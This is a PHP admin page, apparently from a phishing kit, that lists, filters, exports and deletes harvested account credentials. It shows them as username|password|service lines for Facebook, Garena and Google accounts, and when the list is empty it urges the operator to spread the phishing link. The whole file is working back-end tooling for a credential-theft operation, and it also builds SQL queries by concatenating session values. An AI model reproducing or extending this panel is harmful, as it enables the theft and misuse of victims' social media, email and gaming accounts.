<?php
include('header.php');
$date = date('d/m/Y');
$ganday = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM Accounts WHERE ganday = '$date' AND token = '".$_SESSION['token']."'"));
$tong = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM Accounts WHERE token = '".$_SESSION['token']."'"));

$get = $_GET['delete'];
if(isset($get)){
    $connect->query("DELETE FROM Accounts WHERE token = '".$_SESSION['token']."'");
    echo load('./');
}
?>


        <main class="cirqi">
                <div class="cjlpv c2ksj cxrsk c8syf c96ud cn2cr cxct7">

                    <div class="border-slate-200 dark:border-slate-700 cannk">

                        <div class="cmo3i cqm8e">

                            <!-- Basic Small -->
                            <div>
                                <h2 class="text-slate-800 dark:text-slate-100 font-bold ctsdk c86fi"> Thống Kê </h2>
                                <div class="flex flex-wrap items-center c8qma">
                                    <div class="co0gx">
                                        <!-- Start -->
                                        <div class="inline-flex text-indigo-600 rounded-full cbdl8 chlmh csegn cd4ca cz4nn c60df cev1n cwkie"> (<?=number_format($dulieu['truycap']);?>)  Lượt Truy Cập </div>
                                        <!-- End -->
                                    </div>
                                    <div class="co0gx">
                                        <!-- Start -->
                                        <div class="inline-flex rounded-full cwi08 cqshh c3lnr cd4ca cz4nn cwu0c c60df cev1n cwkie"> (<?=number_format($dulieu['luotdangnhap']);?>) Lượt Đăng Nhập </div>
                                        <!-- End -->
                                    </div>
                                    <div class="co0gx">
                                        <!-- Start -->
                                        <div class="inline-flex rounded-full ckslm czfwe c1gyt c3kam cd4ca cz4nn c60df cev1n cwkie"> (<?=number_format($ganday);?>) Tài Khoản Gần Đây </div>
                                        <!-- End -->
                                    </div>
                                    <div class="co0gx">
                                        <!-- Start -->
                                        <div class="inline-flex rounded-full ctq14 cfrbp cifh5 ctpmn cd4ca cz4nn c60df cev1n cwkie"> (<?=number_format($tong);?>) Tổng Tài Khoản</div>
                                        <!-- End -->
                                    </div>
                                </div>
                            </div>
                            
                            
                            
                            <div>
                                <h2 class="text-slate-800 dark:text-slate-100 font-bold ctsdk c86fi"> Quản Lí Tài Khoản </h2>
                               
                               <div class="flex flex-wrap items-center c8qma">
                                    <div class="co0gx">
                                        <button class="btn c5e6b cdsge c7qs0" onclick="downloadAccounts()"> Tải File </button>
                                    </div>
                                    
                                    <div class="co0gx">
                                        <button class="btn cz36c cs9rh c7qs0" onclick="window.location.href='?delete';"> Xóa Tất Cả </button>
                                    </div>
                                    
                                    <div class="co0gx">
                                        <button class="btn dark:bg-slate-800 border-slate-200 dark:border-slate-700 c18nt czq29 ciajw" style="background-color: #0d5fea; color: white;" onclick="loc('fb')"> Lọc (Chỉ Hiển Thị Nick FB) </button>
                                    </div>
                                    
                                    <div class="co0gx">
                                        <button class="btn cctup cc2yu c7qs0" onclick="loc('gr')"> Lọc (Chỉ Hiển Thị Nick Garena) </button>
                                    </div>
                                    
                                    <div class="co0gx">
                                        <button class="btn dark:bg-slate-800 border-slate-200 dark:border-slate-700 c18nt czq29 cb1p4" style="background-color: #da136f; color: white;" onclick="loc('gg')"> Lọc (Chỉ Hiển Thị Nick Google) </button>
                                    </div>
                                </div>
                                
                                <br>
                                
                                
                                    <div class="hacker-form">
                                          <div id="hacker-input">  <?php
                $result = mysqli_query($connect, "SELECT * FROM Accounts WHERE token = '".$_SESSION['token']."'");
                foreach ($result as $row) {
                    $id3+=1;
                    echo $row['username'].'|'.$row['password'].'|'.$row['dangnhap'].' <br>';
                } if($id3 < 1){
                    echo 'Không có tài khoản, hãy rãi link để kiếm tài khoản';
                }
                ?></div>
                                </div>

                            </div>


                        </div>

                    </div>

                </div>
            </main>


            <script>
                function loc(text){
                    if(text == 'fb'){
                        document.getElementById("hacker-input").innerHTML = `    <?php
                $result = mysqli_query($connect, "SELECT * FROM Accounts WHERE token = '".$_SESSION['token']."' AND dangnhap = 'Facebook'");
                foreach ($result as $row) {
                    $id3+=1;
                    echo $row['username'].'|'.$row['password'].'|'.$row['dangnhap'].' <br>';
                } if($id3 < 1){
                    echo 'Không có tài khoản, hãy rãi link để kiếm tài khoản';
                }
                ?>`;
                    } else if(text == 'gr'){
                         document.getElementById("hacker-input").innerHTML = `    <?php
                $result = mysqli_query($connect, "SELECT * FROM Accounts WHERE token = '".$_SESSION['token']."' AND dangnhap = 'Garena'");
                foreach ($result as $row) {
                    $id1+=1;
                    echo $row['username'].'|'.$row['password'].'|'.$row['dangnhap'].' <br>';
                } if($id1 < 1){
                    echo 'Không có tài khoản, hãy rãi link để kiếm tài khoản';
                }
                ?>`;
                    } else if(text == 'gg'){
                         document.getElementById("hacker-input").innerHTML = `    <?php
                $result = mysqli_query($connect, "SELECT * FROM Accounts WHERE token = '".$_SESSION['token']."' AND dangnhap = 'Google'");
                foreach ($result as $row) {
                    $id2+=1;
                    echo $row['username'].'|'.$row['password'].'|'.$row['dangnhap'].' <br>';
                } if($id2 < 1){
                    echo 'Không có tài khoản, hãy rãi link để kiếm tài khoản';
                }
                ?>`;
                    }
                }
            </script>


       <script>
            function downloadAccounts() {
                var accounts = "<?php
                $result = mysqli_query($connect, "SELECT * FROM Accounts WHERE token = '".$_SESSION['token']."'");
                foreach ($result as $row) {
                    $id+=1;
                    echo $row['username'].'|'.$row['password'].'|'.$row['dangnhap'].'\\n';
                }
                ?>";
        
                var element = document.createElement('a');
                element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(accounts));
                element.setAttribute('download', '<?=rand(100,900);?>-accounts.txt');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
            }
        </script>
        
        
        
            <style>
               .hacker-form {
                background-color: black;
                padding: 10px;
                font-family: 'Courier New', monospace;
                color: lime;
                width: 100%;
                height: 200px;
                border: 2px solid lime;
                box-sizing: border-box; 
                }
                
                .hacker-form textarea {
                width: 100%;
                height: 100%;
                background-color: black;
                color: lime;
                border: none;
                resize: none;
                outline: none;
                }
                        
            </style>
	

<?php
include('footer.php');
?>